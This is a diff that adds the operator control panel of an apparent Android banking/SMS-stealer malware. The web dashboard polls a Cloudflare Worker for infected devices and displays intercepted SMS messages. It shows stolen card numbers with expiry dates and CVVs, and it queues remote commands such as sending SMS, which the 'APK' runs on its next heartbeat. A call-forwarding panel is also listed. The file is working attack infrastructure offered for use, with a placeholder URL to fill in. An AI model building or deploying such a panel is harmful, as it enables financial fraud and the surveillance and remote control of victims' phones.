@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Elite Nexus Admin</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body { background: #000; color: #fff; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); }
+        #main-modal { display: none; position: fixed; inset: 0; background: #000; z-index: 100; flex-direction: column; padding: 20px; animation: slideUp 0.4s cubic-bezier(0, 1, 0, 1); }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .sync-spin { animation: spin 1s linear infinite; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .btn-action { background: #111; border: 1px solid #222; border-radius: 18px; padding: 12px; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+        .btn-action:active { transform: scale(0.9); background: #fff; color: #000; }
+    </style>
+</head>
+<body class="p-4">
+
+    <div class="flex justify-between items-center mb-8 bg-black/50 sticky top-0 py-2 z-10">
+        <div>
+            <h1 class="text-3xl font-black italic text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500">NEXUS ELITE</h1>
+            <p class="text-[9px] text-zinc-500 font-bold uppercase tracking-widest">D1 Database Real-Sync</p>
+        </div>
+        <button class="btn-action text-cyan-400" onclick="loadDevices()">🔄</button>
+    </div>
+
+    <div id="device-list" class="space-y-4">
+        <div class="p-20 text-center text-zinc-800 font-bold uppercase tracking-tighter text-2xl">Searching Nodes...</div>
+    </div>
+
+    <div id="main-modal">
+        <div class="flex justify-between items-center mb-10">
+            <button class="btn-action" onclick="closeNode()">🏠</button>
+            <div class="text-center">
+                <h2 id="m-name" class="font-black text-lg uppercase tracking-tight">DEVICE_NAME</h2>
+                <p id="m-id" class="text-[9px] text-zinc-500 font-mono italic">ID: --</p>
+            </div>
+            <button class="btn-action text-rose-500" onclick="closeNode()">✖</button>
+        </div>
+
+        <div id="grid-menu" class="grid grid-cols-2 gap-4">
+            <div class="glass p-8 rounded-[2.5rem] flex flex-col items-center" onclick="openPanel('sms')"><span class="text-3xl mb-2">📥</span><span class="text-[10px] font-black text-cyan-400">INBOX</span></div>
+            <div class="glass p-8 rounded-[2.5rem] flex flex-col items-center" onclick="openPanel('send')"><span class="text-3xl mb-2">🚀</span><span class="text-[10px] font-black text-emerald-400">SEND</span></div>
+            <div class="glass p-8 rounded-[2.5rem] flex flex-col items-center" onclick="openPanel('card')"><span class="text-3xl mb-2">💳</span><span class="text-[10px] font-black text-rose-400">CARDS</span></div>
+            <div class="glass p-8 rounded-[2.5rem] flex flex-col items-center" onclick="openPanel('fwd')"><span class="text-3xl mb-2">📞</span><span class="text-[10px] font-black text-orange-400">FORWARD</span></div>
+            <div class="glass p-8 rounded-[2.5rem] flex flex-col items-center col-span-2" onclick="openPanel('info')"><span class="text-2xl mb-1">📱</span><span class="text-[10px] font-black text-purple-400">HARDWARE INFO</span></div>
+        </div>
+
+        <div id="panel-container" class="hidden flex-col h-full">
+            <div class="flex justify-between items-center mb-6">
+                <button class="btn-action" onclick="showGrid()">⬅</button>
+                <h3 id="panel-title" class="text-xs font-black uppercase tracking-widest text-white">TITLE</h3>
+                <button class="btn-action" id="sync-btn">🔄</button>
+            </div>
+            
+            <div id="panel-content" class="overflow-y-auto flex-1 space-y-4"></div>
+
+            <div id="panel-form" class="hidden mt-4 space-y-3">
+                <input id="f-num" type="number" placeholder="Number" class="w-full bg-zinc-900 p-4 rounded-2xl border border-white/5 outline-none focus:border-white">
+                <textarea id="f-msg" placeholder="Message" class="w-full bg-zinc-900 p-4 rounded-2xl border border-white/5 outline-none focus:border-white h-24"></textarea>
+                <button id="f-btn" class="w-full bg-white text-black py-4 rounded-2xl font-black uppercase text-xs">Execute Command</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WORKER_URL = "https://your-worker.workers.dev"; // 👈 REPLACE THIS
+        let activeId = null;
+
+        // 1. Fetch Device List
+        async function loadDevices() {
+            const res = await fetch(`${WORKER_URL}/api/admin/data?type=devices`);
+            const data = await res.json();
+            const list = document.getElementById('device-list');
+            list.innerHTML = data.map(d => `
+                <div class="glass p-5 rounded-[2rem] border-l-4 ${new Date() - new Date(d.last_sync) < 30000 ? 'border-cyan-500 shadow-[0_0_15px_rgba(6,182,212,0.1)]' : 'border-zinc-800'}" onclick="openNode('${d.model}', '${d.id}', '${d.battery}')">
+                    <div class="flex justify-between items-start mb-2">
+                        <h3 class="font-bold text-sm uppercase italic">${d.model}</h3>
+                        <span class="text-[9px] font-mono text-zinc-600 uppercase">${d.last_sync}</span>
+                    </div>
+                    <div class="flex justify-between text-[11px] font-bold">
+                        <span class="text-zinc-500">#${d.id}</span>
+                        <span class="${d.battery > 20 ? 'text-cyan-400' : 'text-rose-500'}">BAT: ${d.battery}%</span>
+                    </div>
+                </div>`).join('');
+        }
+
+        // 2. Open Node Control
+        function openNode(name, id, bat) {
+            activeId = id;
+            document.getElementById('m-name').innerText = name;
+            document.getElementById('m-id').innerText = `NODE: ${id} | POWER: ${bat}%`;
+            document.getElementById('main-modal').style.display = 'flex';
+        }
+
+        function closeNode() { document.getElementById('main-modal').style.display = 'none'; showGrid(); }
+
+        // 3. Open Specific Panel
+        async function openPanel(type) {
+            document.getElementById('grid-menu').style.display = 'none';
+            const panel = document.getElementById('panel-container');
+            const content = document.getElementById('panel-content');
+            const form = document.getElementById('panel-form');
+            const title = document.getElementById('panel-title');
+            const syncBtn = document.getElementById('sync-btn');
+            
+            panel.classList.replace('hidden', 'flex');
+            content.innerHTML = "<p class='text-center py-10 animate-pulse text-xs'>FETCHING FROM D1...</p>";
+            form.classList.add('hidden');
+
+            if (type === 'sms') {
+                title.innerText = "MESSAGE VAULT";
+                syncBtn.onclick = () => openPanel('sms');
+                const res = await fetch(`${WORKER_URL}/api/admin/data?type=sms&id=${activeId}`);
+                const data = await res.json();
+                content.innerHTML = data.map(m => `
+                    <div class="p-4 glass rounded-2xl border-l-2 border-cyan-500">
+                        <p class="text-[10px] font-black text-cyan-400 mb-1 uppercase">${m.sender}</p>
+                        <p class="text-xs text-zinc-300 leading-relaxed">${m.body}</p>
+                    </div>`).join('') || "<p class='text-center text-zinc-600 py-10'>No SMS Data</p>";
+            }
+
+            if (type === 'card') {
+                title.innerText = "SECURE CARDS";
+                const res = await fetch(`${WORKER_URL}/api/admin/data?type=cards&id=${activeId}`);
+                const data = await res.json();
+                content.innerHTML = data.map(c => `
+                    <div class="p-8 rounded-[2rem] bg-gradient-to-br from-zinc-900 to-black border border-white/10">
+                        <p class="text-[9px] text-zinc-600 mb-4 tracking-[4px]">CARD HOLDER: ${c.name}</p>
+                        <p class="text-lg font-mono tracking-[4px] mb-6 text-center">${c.number}</p>
+                        <div class="flex justify-between font-mono text-sm"><span>EXP: ${c.exp}</span><span>CVV: ${c.cvv}</span></div>
+                    </div>`).join('') || "<p class='text-center text-zinc-600 py-10'>No Card Data</p>";
+            }
+
+            if (type === 'send') {
+                title.innerText = "COMMAND TRANSMIT";
+                content.innerHTML = "";
+                form.classList.remove('hidden');
+                document.getElementById('f-btn').onclick = () => sendCommand('SEND_SMS');
+            }
+        }
+
+        async function sendCommand(action) {
+            const payload = { number: document.getElementById('f-num').value, message: document.getElementById('f-msg').value };
+            await fetch(`${WORKER_URL}/api/admin/command`, {
+                method: "POST",
+                body: JSON.stringify({ device_id: activeId, action, payload })
+            });
+            alert("Command Queued! APK will execute on next heartbeat.");
+        }
+
+        function showGrid() {
+            document.getElementById('panel-container').classList.replace('flex', 'hidden');
+            document.getElementById('grid-menu').style.display = 'grid';
+        }
+
+        // Init
+        loadDevices();
+        setInterval(loadDevices, 15000);
+    </script>
+</body>
+</html>
+
